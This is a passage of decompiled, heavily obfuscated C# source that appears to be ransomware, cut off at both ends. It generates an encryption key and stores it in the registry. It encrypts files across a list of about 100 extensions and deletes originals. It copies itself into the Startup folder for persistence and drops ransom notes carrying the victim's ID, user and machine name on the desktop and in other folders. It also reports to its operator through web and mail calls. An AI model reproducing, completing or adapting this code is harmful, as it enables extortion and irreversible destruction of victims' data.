							}
						}
						if (VSeBsFuIKiNqF)
						{
							if (hJijbCOiRyyoj != getString_0(107382415))
							{
								mkjUeNwAcldzu(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, bytes);
							}
							else
							{
								mkjUeNwAcldzu(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, bytes);
							}
						}
					}
					end_IL_032d:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a1f;
			IL_0a1f:
			CUuOmmxXYbdtCA.Remove(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
		}

		static MIWsSuEMIryyp()
		{
			Strings.CreateGetStringDelegate(typeof(MIWsSuEMIryyp));
		}
	}

	private sealed class SUkdGETNoCP
	{
		public string hBmTXxzEOo;

		public string VcUtNNGzkJCI;

		public void _003CEncrypt2_003Eb__42()
		{
			while (true)
			{
				try
				{
					File.Delete(hBmTXxzEOo);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__43()
		{
			while (true)
			{
				try
				{
					if (File.Exists(VcUtNNGzkJCI))
					{
						File.Delete(VcUtNNGzkJCI);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string wZViDAUBvyJWckg;

	public static byte[] LGcIAPIHUXZNO;

	public static string MIxirqlACCH;

	public static string YsIgwUYIkhJk;

	public static List<string> UnsVNkGvmiq;

	public static List<string> gRQbJrWftCBRaA;

	public static string aOjnCzAamNo;

	public static string yifqLwxnUift;

	public static string lASimeaIGcCh;

	public static string kqGxspAqmKwYfMRE;

	public static string fOdqhhYcGXYCQhD;

	public static int kUDFpFbecfvt;

	public static string nUcCUJIepUVWBM;

	public static string VRKQUcDkAXFBsw;

	public static string IbngcvXVqUay;

	public static string FDksBsxiqNIP;

	public static string axNvoMiUlTfVi;

	public static string uUqLStTTRWpfB;

	public static string MWBxDJHVzVVlkkG;

	public static string VvEXsnSpTne;

	public static List<string> lsYvEarxPuHJY;

	public static List<string> DhgHRwHTnLl;

	public static string GVjmRveZBheoB;

	public static string kFEPtOoFLrARK;

	public static string JsjzvciSYHGaNPD;

	public static List<string> aacDzVOnoKU;

	public static string RXIvcNxQCBkNLNLT;

	private static string ElBXdvdNPyUDl;

	public static string nAhrhGGnjLvL;

	public static string nQCoBwwBsQBI;

	public static List<string> cQAeQsXjtYRcv;

	public static List<string> lwXnKcBqjUg;

	public static List<string> ZwCTwpgPpCNTnG;

	public static List<string> HwMUOlrDhqcCP;

	public static string CdlcYQkbZfgX;

	public static List<string> FGNmVQpFiIbRC;

	public static List<string> vCnEwZnUkyEf;

	public static string dzXbLfIlxqQ;

	public static string KdHfizAWJPBxZw;

	internal static DateTime dpYJGRudJnY;

	internal static DateTime JJZijoXiUb;

	public static string yKirRorQtiUWa;

	public static string OLieTsrCJKKkG;

	public static string onexTuCIHp;

	public static string AAzsszDLtBArMH;

	public static string WTLzBflxaiHP;

	public static string LvBDhURvzQmNBGxJkM;

	public static string DdoPVfjRRWF;

	public static string OULbCWoifC;

	public static List<string> QrfGnpJnAuCjH;

	public static string cfLqyLJDABPGnW;

	public static string IAXzEIcMsJCbe;

	public static string HOQqgSjsqWjS;

	public static string AsHJUQfrCAxHnEB;

	public static string NYOvhfGfpZr;

	public static string tgEjSEnjUdT;

	public static string qsltNPUduYmpyr;

	public static string JizROfsTywT;

	public static string MkHTMejTyEeX;

	public static string TqelslmXbJvdcP;

	public static string zAuvhVvxsCxr;

	public static string sFGarQNRmknpg;

	public static string FfRBXtJzfTfpvsd;

	public static string aKVrenHUiYNV;

	public static string skxIDVgRVdAms;

	public static string UBIebuPCWWP;

	public static string wAALYJEzpSbZBjuaT;

	public static string kEZakHfcUVsoCC;

	public static string ybLkXQhPvGkZaed;

	public static string PYZhiSywDob;

	public static string RyZMxmbkHOIZd;

	public static string htXuARfQsTaOzn;

	public static string IEkfRfOeAmhoYXS;

	public static string tycSbqqsFixXM;

	public static string tHTQdTsQZMje;

	public static string TAartoIOiNMPV;

	public static string MTAYyryxkzLI;

	public static string rqsouaVqcA;

	public static string ZYkRnxhSkNKv;

	public static string[] xzbVbgXgcctL;

	public static string rDydiOTZjcpMjk;

	public static bool EwFuVhMNxUkHL;

	public static string PKReouIgQxS;

	public static bool VSeBsFuIKiNqF;

	public static bool hnXMuSJejkhzfs;

	public static bool RSvgbGpXBTzyX;

	public static bool VHbfyNRuqMkcdo;

	public static string IuaKWfBuBpJ;

	public static bool XtQtDAAqcssaA;

	public static bool hMexcXoWCkuIBYoAa;

	public static bool pMXUdBqauLzs;

	public static bool BrcuPGYukd;

	public static bool TBRkxWpRCztklVA;

	public static string NBDdFqpqnBRofW;

	public static bool vgTZYvMerotpU;

	public static Stopwatch XtTGpVAaSDf;

	public static int azNcSbADWgl;

	public static int bXnXKaTzlpeizP;

	public static bool MNVRxjtsYUxy;

	public static string WesWtWKgSJxOqJ;

	public static string[] MuoFAbiFfQlN;

	public static List<string> QWxPUGvdhGrBfq;

	public static int PtQKcSkXgtK;

	public static bool psULbGGEegD;

	public static bool DeNCLABlYIcR;

	public static bool SwRXhEADhj;

	public static bool YPOtaoUqsbFHYPF;

	public static bool fQfUKzhPUI;

	public static List<string> LwKYIqEXuWxMEvK;

	public static List<string> yqDomuIqnBM;

	public static List<string> dhxcVqwWUj;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			aNONGKaYCkHOllyj CS_0024_003C_003E8__locals0 = new aNONGKaYCkHOllyj();
			CS_0024_003C_003E8__locals0.KnxGsfHEYQrBJ = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.KnxGsfHEYQrBJ) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			HjZRuOyGETBgL.aKhhPnHiXwcn(ElBXdvdNPyUDl);
		}
		catch (Exception)
		{
		}
		try
		{
			if (TAartoIOiNMPV == getString_0(107396830))
			{
				Thread thread = new Thread(fSsgpVfOpTOTDR.rMcWfiEYhQmd);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (IbngcvXVqUay == getString_0(107396830))
		{
			Thread.Sleep(int.Parse(FDksBsxiqNIP));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && DdoPVfjRRWF == getString_0(107396830))
		{
			try
			{
				tIqyjNWBfPKQE(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107396825))));
			}
			catch
			{
			}
		}
		try
		{
			if (MWBxDJHVzVVlkkG == getString_0(107396830) && tAirwJcilFJbsb.lTELKJSoRWOIaFcy())
			{
				new kBiTNTEZalKoktNo().bRhLbapXWtWCpW(bool_0: false);
				tAirwJcilFJbsb.aBJqxhVrhuusq();
			}
		}
		catch (Exception)
		{
		}
		if (kFEPtOoFLrARK == getString_0(107396830) && tAirwJcilFJbsb.lTELKJSoRWOIaFcy())
		{
			new kBiTNTEZalKoktNo().bRhLbapXWtWCpW(bool_0: false);
			new kBiTNTEZalKoktNo().hQFKzthHyuG();
		}
		if (VRKQUcDkAXFBsw == getString_0(107396830))
		{
			CLNtqwwlUxB.vegBEdnjieowqZk();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396752);
			string text2 = text + Path.GetFileName(fileName);
			if (fOdqhhYcGXYCQhD == getString_0(107396830) && fileName != text2)
			{
				Thread thread2 = new Thread(WpIfUsWFlaoV);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (aOjnCzAamNo == getString_0(107396830) && mainModule != null && fileName != text2)
			{
				try
				{
					kUDFpFbecfvt = qLyAElQZQzbLir(0, lsYvEarxPuHJY.Count);
					File.Copy(fileName, text + lsYvEarxPuHJY[kUDFpFbecfvt], overwrite: true);
					getString_0(107396747);
					Process.Start(text + lsYvEarxPuHJY[kUDFpFbecfvt]);
					oUCKpBBKSBqKN();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (dzXbLfIlxqQ == getString_0(107396830) && DateTime.Now < dpYJGRudJnY)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (KdHfizAWJPBxZw == getString_0(107396830) && DateTime.Now > JJZijoXiUb)
			{
				oUCKpBBKSBqKN();
			}
		}
		catch
		{
		}
		NLXNIAFZUBNL();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = lwXnKcBqjUg;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382841)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					List<string> source2 = cQAeQsXjtYRcv;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107384399)), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				List<string> zwCTwpgPpCNTnG = ZwCTwpgPpCNTnG;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), string_0);
					};
				}
				Parallel.ForEach(zwCTwpgPpCNTnG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				if (ZYkRnxhSkNKv == getString_0(107396830))
				{
					string[] source3 = xzbVbgXgcctL;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382860)), getString_0(107382835) + string_0 + getString_0(107382826));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				if (!uGgsLnwioPEKG().Contains(getString_0(107382546)))
				{
					RTrKmYslaoZrDdzW(CdlcYQkbZfgX);
				}
				else
				{
					List<string> hwMUOlrDhqcCP = HwMUOlrDhqcCP;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							gzgGVgooFWELQWZ(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107382789))), string_0);
						};
					}
					Parallel.ForEach(hwMUOlrDhqcCP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				List<string> fGNmVQpFiIbRC = FGNmVQpFiIbRC;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107382796)), string_0);
					};
				}
				Parallel.ForEach(fGNmVQpFiIbRC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!UnsVNkGvmiq.Contains(currentDirectory))
			{
				UnsVNkGvmiq.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396321))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396321)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396336)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !UnsVNkGvmiq.Contains(text6) && text6 != getString_0(107396283) && text6 != getString_0(107396262) && text6 != getString_0(107396273))
								{
									UnsVNkGvmiq.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396244)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396711))
						{
							FfRBXtJzfTfpvsd = getString_0(107396830);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396702))
						{
							FfRBXtJzfTfpvsd = getString_0(107396725);
						}
					}
					if (text3.Contains(getString_0(107396720)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396711))
						{
							vgTZYvMerotpU = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396702))
						{
							vgTZYvMerotpU = false;
						}
					}
					if (text3.Contains(getString_0(107396671)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396711))
						{
							XtQtDAAqcssaA = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396702))
						{
							XtQtDAAqcssaA = false;
						}
					}
					if (text3.Contains(getString_0(107396690)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396711))
						{
							psULbGGEegD = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396702))
						{
							psULbGGEegD = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(IuaKWfBuBpJ, getString_0(107396661) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (FfRBXtJzfTfpvsd == getString_0(107396725))
		{
			IQdJQPJIVJIj();
		}
		if (DeNCLABlYIcR)
		{
			try
			{
				Console.WriteLine(getString_0(107396616));
				TmaKlhyeqwePQX.AfubGxSkuqs();
			}
			catch (Exception ex6)
			{
				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107396563) + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (FfRBXtJzfTfpvsd == getString_0(107396830))
		{
			try
			{
				oYaejXZViJDyn();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && RSvgbGpXBTzyX)
			{
				try
				{
					Thread thread4 = new Thread(mIyPClLKYPq.MbeaFiDLkvqqWDS);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			gzgGVgooFWELQWZ(getString_0(107396486), VzYMPTFsHuw(getString_0(107396473)));
		}
		SecureString secureString = new SecureString();
		if (onexTuCIHp == getString_0(107396725))
		{
			yifqLwxnUift = ThOKKwmMfJiX.BlSETJxqpQ(32);
			lASimeaIGcCh = ThOKKwmMfJiX.DMzfoLKJIRuT();
		}
		else
		{
			yifqLwxnUift = getString_0(107395920);
		}
		kqGxspAqmKwYfMRE = GHzJzZuwQaDX.ELbJqhwoOAFh(yifqLwxnUift + lASimeaIGcCh);
		try
		{
			if (!VSeBsFuIKiNqF)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(VzYMPTFsHuw(getString_0(107395843)));
				if (registryKey != null)
				{
					registryKey.SetValue(VzYMPTFsHuw(getString_0(107395830)) + (registryKey.ValueCount + 1), kqGxspAqmKwYfMRE);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(VzYMPTFsHuw(getString_0(107395843)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(VzYMPTFsHuw(getString_0(107395830)) + (registryKey.ValueCount + 1), kqGxspAqmKwYfMRE);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			fQfUKzhPUI = true;
		}
		if (pMXUdBqauLzs)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), NBDdFqpqnBRofW)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), NBDdFqpqnBRofW), string.Concat(VzYMPTFsHuw(getString_0(107395821)), new WebClient().DownloadString(VzYMPTFsHuw(getString_0(107395796))), getString_0(107395755), VzYMPTFsHuw(getString_0(107395718)), DateTime.Now, getString_0(107395755), VzYMPTFsHuw(getString_0(107396189)), kqGxspAqmKwYfMRE));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), NBDdFqpqnBRofW), getString_0(107396132) + kqGxspAqmKwYfMRE);
				}
			}
			catch (Exception ex11)
			{
				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107396103) + ex11.Message + getString_0(107395755));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!YPOtaoUqsbFHYPF || fQfUKzhPUI)
		{
			hHTUJTjocDqx.YYQeOqUzbff(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), PYZhiSywDob), vLEIkxjZfsc(kqGxspAqmKwYfMRE), null, null, getString_0(107396086), getString_0(107396037), null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			DjOAlDtiFJsu();
		}
		try
		{
			try
			{
				if (vgTZYvMerotpU)
				{
					Console.WriteLine(getString_0(107396052));
				}
			}
			catch
			{
			}
			ebeKUKwKqklcMA(new string[1] { getString_0(107395971) }, new string[100]
			{
				getString_0(107395962),
				getString_0(107395989),
				getString_0(107395984),
				getString_0(107395431),
				getString_0(107395426),
				getString_0(107395421),
				getString_0(107395416),
				getString_0(107395443),
				getString_0(107395438),
				getString_0(107395433),
				getString_0(107395396),
				getString_0(107395391),
				getString_0(107395414),
				getString_0(107395409),
				getString_0(107395400),
				getString_0(107395363),
				getString_0(107395358),
				getString_0(107395353),
				getString_0(107395380),
				getString_0(107395375),
				getString_0(107395334),
				getString_0(107395329),
				getString_0(107395324),
				getString_0(107395351),
				getString_0(107395346),
				getString_0(107395341),
				getString_0(107395336),
				getString_0(107395299),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395316),
				getString_0(107395311),
				getString_0(107395306),
				getString_0(107395269),
				getString_0(107395260),
				getString_0(107395287),
				getString_0(107395282),
				getString_0(107395277),
				getString_0(107395416),
				getString_0(107395272),
				getString_0(107395438),
				getString_0(107395231),
				getString_0(107395226),
				getString_0(107395253),
				getString_0(107395248),
				getString_0(107395243),
				getString_0(107395206),
				getString_0(107395201),
				getString_0(107395196),
				getString_0(107395223),
				getString_0(107395218),
				getString_0(107395213),
				getString_0(107395208),
				getString_0(107395683),
				getString_0(107395678),
				getString_0(107395673),
				getString_0(107395700),
				getString_0(107395695),
				getString_0(107395654),
				getString_0(107395649),
				getString_0(107395640),
				getString_0(107395659),
				getString_0(107395272),
				getString_0(107395614),
				getString_0(107395637),
				getString_0(107395628),
				getString_0(107395587),
				getString_0(107395578),
				getString_0(107395601),
				getString_0(107395596),
				getString_0(107395555),
				getString_0(107395546),
				getString_0(107395569),
				getString_0(107395564),
				getString_0(107395527),
				getString_0(107395522),
				getString_0(107395517),
				getString_0(107395512),
				getString_0(107395539),
				getString_0(107395530),
				getString_0(107395493),
				getString_0(107395488),
				getString_0(107395483),
				getString_0(107395510),
				getString_0(107395505),
				getString_0(107395496),
				getString_0(107395455),
				getString_0(107395450),
				getString_0(107395306),
				getString_0(107395477),
				getString_0(107395472),
				getString_0(107395467),
				getString_0(107394918),
				getString_0(107394913),
				getString_0(107394904),
				getString_0(107394931),
				getString_0(107394926),
				getString_0(107394885),
				getString_0(107394880),
				getString_0(107394875)
			}, new string[0], yifqLwxnUift, getString_0(107394902));
		}
		catch (Exception ex6)
		{
			if (XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(IuaKWfBuBpJ, getString_0(107394865) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!YPOtaoUqsbFHYPF || fQfUKzhPUI)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808));
					streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394783)).Replace(getString_0(107394993), chuLHDnVuoGm.CcLbwvTyIfmg()).Replace(getString_0(107394984), Environment.UserName).Replace(getString_0(107394967), Environment.MachineName)
						.Replace(getString_0(107394402), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395755));
					if (SwRXhEADhj || !VSeBsFuIKiNqF)
					{
						streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394417)));
						streamWriter.WriteLine(kqGxspAqmKwYfMRE);
					}
					if (nAhrhGGnjLvL == getString_0(107396725))
					{
						streamWriter.WriteLine(getString_0(107395755));
						streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394368)) + Convert.ToString(aacDzVOnoKU.Count));
					}
					if (MNVRxjtsYUxy)
					{
						streamWriter.WriteLine(getString_0(107395755));
						streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394323)));
						streamWriter.WriteLine(chuLHDnVuoGm.CcLbwvTyIfmg());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808));
					if (!text7.Contains(kqGxspAqmKwYfMRE) && !VSeBsFuIKiNqF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808), getString_0(107394290) + kqGxspAqmKwYfMRE);
					}
				}
			}
			catch (Exception ex6)
			{
				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107394261) + ex6.Message + getString_0(107395755));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in DhgHRwHTnLl)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107394808)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808), item + getString_0(107394808), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808));
						if (!text7.Contains(kqGxspAqmKwYfMRE) && !VSeBsFuIKiNqF)
						{
							File.AppendAllText(item + getString_0(107394808), getString_0(107394290) + kqGxspAqmKwYfMRE);
						}
					}
				}
				catch (Exception ex6)
				{
					if (XtQtDAAqcssaA)
					{
						try
						{
							File.AppendAllText(IuaKWfBuBpJ, getString_0(107394261) + ex6.Message + getString_0(107395755));
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!VHbfyNRuqMkcdo && num > 10)
				{
					break;
				}
			}
		}
		if ((IEkfRfOeAmhoYXS == getString_0(107396830) && !YPOtaoUqsbFHYPF) || (IEkfRfOeAmhoYXS == getString_0(107396830) && fQfUKzhPUI))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394216)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394216));
					streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394191)).Replace(getString_0(107394993), chuLHDnVuoGm.CcLbwvTyIfmg()).Replace(getString_0(107394984), Environment.UserName).Replace(getString_0(107394967), Environment.MachineName)
						.Replace(getString_0(107394402), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395755));
					if (SwRXhEADhj || !VSeBsFuIKiNqF)
					{
						streamWriter.WriteLine(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107386133))));
						streamWriter.WriteLine(kqGxspAqmKwYfMRE + VzYMPTFsHuw(getString_0(107386060)));
					}
					if (nAhrhGGnjLvL == getString_0(107396725))
					{
						streamWriter.WriteLine(getString_0(107395755));
						streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107386015)) + VzYMPTFsHuw(getString_0(107394368)) + Convert.ToString(aacDzVOnoKU.Count) + VzYMPTFsHuw(getString_0(107386060)));
					}
					if (MNVRxjtsYUxy)
					{
						streamWriter.WriteLine(getString_0(107395755));
						streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394323)));
						streamWriter.WriteLine(chuLHDnVuoGm.CcLbwvTyIfmg());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808));
					if (!text7.Contains(kqGxspAqmKwYfMRE) && !VSeBsFuIKiNqF)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394216), VzYMPTFsHuw(getString_0(107386015)) + getString_0(107394290) + kqGxspAqmKwYfMRE + VzYMPTFsHuw(getString_0(107386060)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107386466) + ex6.Message + getString_0(107395755));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (RXIvcNxQCBkNLNLT == getString_0(107396830))
		{
			try
			{
				if (nAhrhGGnjLvL == getString_0(107396725))
				{
					chuLHDnVuoGm.qYXzLYoMUQsw(getString_0(107386441), getString_0(107386404), getString_0(107386423), string.Concat(VzYMPTFsHuw(getString_0(107395821)), new WebClient().DownloadString(VzYMPTFsHuw(getString_0(107395796))), getString_0(107386414), VzYMPTFsHuw(getString_0(107395718)), DateTime.Now, getString_0(107395755), VzYMPTFsHuw(getString_0(107386409)), Convert.ToString(aacDzVOnoKU.Count), getString_0(107395755), VzYMPTFsHuw(getString_0(107396189)), kqGxspAqmKwYfMRE));
				}
				else
				{
					chuLHDnVuoGm.qYXzLYoMUQsw(getString_0(107386441), getString_0(107386404), getString_0(107386423), string.Concat(VzYMPTFsHuw(getString_0(107395821)), new WebClient().DownloadString(VzYMPTFsHuw(getString_0(107395796))), getString_0(107386414), VzYMPTFsHuw(getString_0(107395718)), DateTime.Now, getString_0(107395755), VzYMPTFsHuw(getString_0(107386409)), Convert.ToString(aacDzVOnoKU.Count), getString_0(107395755), VzYMPTFsHuw(getString_0(107396189)), kqGxspAqmKwYfMRE));
				}
			}
			catch
			{
			}
		}
		if (VvEXsnSpTne == getString_0(107396830))
		{
			try
			{
				xpUgWvkQuFkAp.SSwagUrYzgPRkaz(new Uri(getString_0(107386328)));
			}
			catch
			{
			}
		}
		if (IEkfRfOeAmhoYXS == getString_0(107396725) && !YPOtaoUqsbFHYPF)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808)))
				{
					Process.Start(VzYMPTFsHuw(getString_0(107386359)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394808));
				}
				try
				{
					if (vgTZYvMerotpU)
					{
						Console.WriteLine(getString_0(107386302));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107386273) + ex6.Message + getString_0(107395755));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (IEkfRfOeAmhoYXS == getString_0(107396830) && !YPOtaoUqsbFHYPF)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394216)))
				{
					Process.Start(VzYMPTFsHuw(getString_0(107386252)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394216));
				}
				try
				{
					if (vgTZYvMerotpU)
					{
						Console.WriteLine(getString_0(107385691));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
